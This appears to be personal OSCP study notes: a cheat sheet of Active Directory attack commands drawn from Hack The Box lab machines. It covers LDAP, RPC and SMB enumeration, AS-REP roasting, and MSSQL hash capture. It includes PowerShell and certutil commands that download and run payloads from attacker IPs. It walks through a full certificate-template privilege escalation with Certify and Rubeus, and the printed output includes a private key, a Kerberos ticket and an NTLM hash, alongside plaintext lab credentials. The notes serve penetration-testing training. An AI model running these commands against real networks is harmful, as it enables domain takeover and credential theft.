# OSCP Note


## DNS Enum:
```
dig  @10.10.10.161 htb.local
=> Asign: dig  @10.10.10.161 forest.htb.local
```
## Ldap Enum:
```
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"

Advance:

ldapsearch -H ldap://10.10.10.192 -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump (With Cred)

ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName "CN=Users,DC=windcorp,DC=HTB" | grep sAMAccountName | awk '{print $2}' > domainusers (Domain Users Enum)

ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
```
## RPC Enum
```
rpcclient -U "" -N 10.10.10.161

Example:
    enumdomusers
    enumdomgroups
    querygroup 0x200
    querygroupmem 0x200
```

## AS-Rep Roasting Enum
```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```
## MSSQL
```
mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#database-access
Responser: responser -I tun0
RCE: EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
```

## SMB Enum
```
Enum:

smbmap -H 10.10.10.161
smbmap -H 10.10.10.161 -u ''
smbmap -H 10.10.10.161 -u 'null'
smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice -R IPC$
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

Login:
smbclient \\\\10.10.10.161\\IPC$ -U 'svc-alfresco%s3rvice'

```

## Windows
### Download File with Powershell
```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1') (Download and run script)
```


## PE
### Windows
#### Enum
```
tasklist /svc

Check history: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
#### PE with Cert
We can use some tool for recommend to find vulnerability => Certify.exe
Firstly, Just use the command `.\Certify.exe find \vulnerable`
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544
...
```
Next step, we can just create a cert to find the hash and ticket `.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator`
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5up7d9B1NxRfywH0N6BwH6d0STVSeWubf603yWv6UQ2hRu6s
5nO4ES+WLJ7WD86G69qiggt3Gen7SFfh3wyOaPhfLp496QQW23a79C3xKVSxfADf
LJQGcyhTI/EM7pnjOB6hjtQ8s0YbtWB5r4nRaw0ltB6oGC4t2Hz3bdpD/dx6++uO
dWKTEfE/x+BHMEDvyEwR69XRpIdzvlCQotMakrTGsSg5eLRCqzifqHv36LNuy6ym
8b+zCVIojKK3nyBiHhPnD1BM7SOzGwKsfYipyME6o1PcIs2ypABApFHEZrxumrVQ
1Khj/KC3M3RMf2+Dkcwjf9cOxujv57YJwJ0V1QIDAQABAoIBAAJ7AliHJLsyvNSx
cK4oSwwMAHPI3tnvDfyRH8hKIKY+Pz1D0xemppOIr1RLYIFK9qgR8Sz0cpMUsF5W
k1aSC/WUtXEKwh9+q8AvxlUZKT4Iat+qIruX23nhNQNt03W8sXQo4BNotD44wpNw
Nd5s3JMJ0R3eNnAMDvIEZaQIdDKF5pLuRiClI9JWkPfz2yJc2FUwWJFlZVTCbTBX
p/ieREd9F34f8K+pLuFY5VmKgWuXhck1mLCQh3IFC8uuTr4Tpoa+wLcxhojRBYyy
LWAqY6OtuyDG1WSYuuIcvMF1YmQwdkfYVlQFThXR5MGMw4pVPrbe15RJzA5aY5jk
ZZwK0QECgYEA77fqZ04i9MIF9dl40pHbpNH15S+7hSRRPpepAaQx1rVJl8ByyWNU
i0rIq82kNtcGm034r65WSniY48zDgMbVU8lsmXMHEMxiI4Vle+o8ba7rBJo2gqbm
l4TScWJSlbqcTOhkBYYdonbBNFYgGl1eg2NLybC++k0FIOeFOpq8ivcCgYEA9pmD
rV1VRFH1uQPsJriVxGeLWqWSCM7YaIH7zuUWwcWlvFDqO91r4hfKm7IrCnz39iJK
jEuyIdH/4ZN4g8vJYdK73OcbhADq4d5wzNB5ZYfiSAhmvg4KNEUilbtmgna5ak/p
Oy04iR0nTT+vb41qzTsGu5RpaMkAMLd3LBREhpMCgYEAydti5Q6k3NmszzMLTLVJ
8WZj21PwYdMNHtnylNFArn4FtGV3wyGDha+5fwIxL4StqYVkzfrN6vPWOqyoS/4i
kOViL2zvHDQex66CoG/D5tCOUlfRYv9L2XcdBiE3TaHQD+r4nrYqqi25z2peqhTJ
i3XH0dSlXHwSv3x1cb3u2k0CgYAz421/pynv7EcGHTstkp2A7EC4XCp0TAHhS6iO
iknVkB8llukSm669rj/lrwG7fTw3wFNrXeonj6aF8p/jK5g+SzdYbhCuH/tMd5/I
mP1STdthSNNFnnKrOPjkBMC3JwAwzIvI9eT1hPrmGEZz9I/Ki2cJRVtAvzqZBaG/
1qvsnQKBgQDFr5Y3qrKYdIqDOJ2ttv0J5FicQRsbUgOMv/Y+lCz9KSMc61Y2p5of
EgIH7dRN4yRgonnzTz18XnNVzjBIy6/WHFywj8MbLf8coIJZD8iEPAeY5JcSVIrr
yP8DWT0xHtECV4pqCq0nlnqndGQidAbccuJ/AOb+IpSmYjfGBa5PwQ==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAApEL/wHgGJfMAAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwOTEzMTcwNTIzWhcNMjUwOTEz
MTcxNTIzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDm6nt30HU3FF/LAfQ3oHAfp3RJ
NVJ5a5t/rTfJa/pRDaFG7qzmc7gRL5YsntYPzobr2qKCC3cZ6ftIV+HfDI5o+F8u
nj3pBBbbdrv0LfEpVLF8AN8slAZzKFMj8QzumeM4HqGO1DyzRhu1YHmvidFrDSW0
HqgYLi3YfPdt2kP93Hr76451YpMR8T/H4EcwQO/ITBHr1dGkh3O+UJCi0xqStMax
KDl4tEKrOJ+oe/fos27LrKbxv7MJUiiMorefIGIeE+cPUEztI7MbAqx9iKnIwTqj
U9wizbKkAECkUcRmvG6atVDUqGP8oLczdEx/b4ORzCN/1w7G6O/ntgnAnRXVAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFEsPBJXyH5BVq2X+daGf4HJnewPO
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAVHIiltv8YNf3xcVMhpkVmUqwTcEpukCLeGliI/MKI5fu9P1QmAxtv3rH
JglsQNMxCGnPLE7v2EEHEZwnEQzxR1cRPsaq2jissHSMuqB0OO9Fk4KpTGnKoe1u
O+x6hRs/fw7iwWk2BVOg8eNzjP01Bfg6wkNNyx4PvtE79bKT97w/r8fYwX5KkJ62
Rho4uHxmdnNHbdxDKeABn6UgTLlXkxuFbuEtopXL209wo49cbmIPt5DZc4d7Dtlr
B69BfMPm5CCkUKcUBBP31kOIAdJ7wb6HREdmJtnC1LoyBZJDAtrX8Iw51jNL+lVO
8cd+7G8X9H4wFMGC4ich18SG7mnb4g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
Then just use `openssl` to make a `cert.pfx` file and upload to the victim
With this we can use this command `.\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx /password:kayiz /getcredentials /show /nowrap` to extract the hash of user you want
```
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::9c55:da51:a79d:8f51%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  9/13/2023 10:25:56 AM
  EndTime                  :  9/13/2023 8:25:56 PM
  RenewTill                :  9/20/2023 10:25:56 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  I0qoH1dNZ4AoXLwYgrWpWw==
  ASREP (key)              :  96C8DE334A2DA623FCA5BCD93D287385

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE ==> Just use it to login with evil-winrm
```

#### BloodHound
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1');Invoke-BloodHound (Just for .ps1)

We can use BloodHound Python to PE with a normal creds If u dont have a shell:
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

#### Dump Hash (Generetic PE)
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```
#### User exploit with group
```
*LAPS-Reader*
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
**Ad Recycle Bin**
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```
